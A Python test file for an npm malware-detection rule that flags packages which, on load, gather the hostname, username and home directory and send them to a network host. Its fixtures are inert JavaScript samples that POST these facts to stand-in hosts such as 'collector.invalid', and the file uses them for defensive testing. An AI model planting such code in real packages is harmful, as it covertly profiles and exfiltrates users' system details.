"""`npm.load-fingerprint` on hand-written, inert trees (parsed, never run)."""

import json

from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
from kitsunox.ecosystems.npm.entry import load_sources
from kitsunox.ecosystems.npm.rules.load_time import LoadFingerprint, bin_files, fingerprints
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
RULE = LoadFingerprint()
PROBE = b"""const os = require("os");
const https = require("https");
const data = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, d: os.homedir() });
const req = https.request({ hostname: "collector.invalid", method: "POST" });
req.write(data);
req.end();
"""
LIBRARY = b"""const os = require("os");
const https = require("https");
function describe() { return { h: os.hostname(), u: os.userInfo().username }; }
function send(body) { return https.request({ hostname: "api.invalid" }).end(body); }
module.exports = { describe, send };
"""


def change(
    files: dict[str, bytes], before: dict[str, bytes] | None = None, manifest: object = None
) -> CodeChange:
    snapshot = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
        publish=PublishInfo(),
        manifest={"name": "kx", "main": "index.js"} if manifest is None else manifest,
    )
    tree = {"package.json": json.dumps(snapshot.manifest).encode(), **files}
    base = None if before is None else {"package.json": b'{"main": "index.js"}', **before}
    return code_change(
        snapshot, tree, base, CACHE, None, "1.0.0" if before else None, load_entries=load_sources
    )


def test_the_load_time_probe_is_medium() -> None:
    (finding,) = RULE.evaluate_code(change({"index.js": PROBE}))
    assert (finding.severity, finding.weight) == (Severity.MEDIUM, 3.0)
    assert "`homedir()`, `hostname()`, `userInfo()`" in finding.explanation
    assert [(e.path, e.line_start) for e in finding.evidence] == [("index.js", 3)] * 3 + [
        ("index.js", 2)  # the network use
    ]


def test_a_file_the_entry_imports_counts() -> None:
    """`archetype-index-sdk@1.0.0`: the entry imports the file that collects and sends."""
    files = {
        "index.js": b'import "./telemetry-info.mjs";\nexport const x = 1;',
        "telemetry-info.mjs": b"""import os from "node:os";
async function main() { const facts = { host: os.hostname(), user: os.userInfo() };
  const https = await import("node:https"); https.request("https://c.invalid").end(); }
main().catch(() => {});
""",
    }
    (finding,) = RULE.evaluate_code(change(files))
    assert "`telemetry-info.mjs`" in finding.explanation


def test_what_does_not_fire() -> None:
    assert RULE.evaluate_code(change({"index.js": LIBRARY})) == ()  # functions not called
    no_network = PROBE.replace(b"https.request", b"console.log").replace(b'require("https")', b"0")
    assert RULE.evaluate_code(change({"index.js": no_network})) == ()
    one_fact = b'const os = require("os"); require("https"); const p = os.homedir() + "/.cfg";'
    assert RULE.evaluate_code(change({"index.js": one_fact})) == ()
    # not loaded: a bin script, a test, a file no entry reaches
    manifest = {"name": "kx", "main": "index.js", "bin": {"kx": "cli.js"}}
    files = {"index.js": b"module.exports = 1;", "cli.js": PROBE, "test/probe.test.js": PROBE}
    assert RULE.evaluate_code(change(files, manifest=manifest)) == ()


def test_the_reads_must_be_in_one_file() -> None:
    files = {
        "index.js": b'require("./a"); require("./b"); require("https");',
        "a.js": b'module.exports = require("os").hostname();',
        "b.js": b'module.exports = require("os").userInfo();',
    }
    assert RULE.evaluate_code(change(files)) == ()
    assert set(fingerprints(change({"index.js": PROBE}).after)) == {"index.js"}


def test_on_updates_only_when_the_previous_version_did_not() -> None:
    assert RULE.evaluate_code(change({"index.js": PROBE}, before={"index.js": PROBE})) == ()
    (finding,) = RULE.evaluate_code(change({"index.js": PROBE}, before={"index.js": LIBRARY}))
    assert finding.rule_id == "npm.load-fingerprint"


def test_without_a_load_profile_nothing_fires() -> None:
    assert RULE.evaluate_code(change({"lib/x.js": PROBE}, manifest={"name": "kx"})) == ()


def test_a_bin_target_does_not_count() -> None:
    """A CLI whose `main` is its `bin` runs the program when required (`codeam-cli`)."""
    for listed in ("./index.js", {"kx": "index.js"}):
        manifest = {"name": "kx", "main": "index.js", "bin": listed}
        assert RULE.evaluate_code(change({"index.js": PROBE}, manifest=manifest)) == ()
    manifest = {"name": "kx", "main": "index.js", "bin": {"kx": "bin/cli.js"}}
    assert len(RULE.evaluate_code(change({"index.js": PROBE}, manifest=manifest))) == 1
    assert bin_files({"bin": ["not", "a", "map"]}) == frozenset()
    assert bin_files({"bin": {"a": "./bin/../cli.js", "b": 3}}) == {"cli.js"}
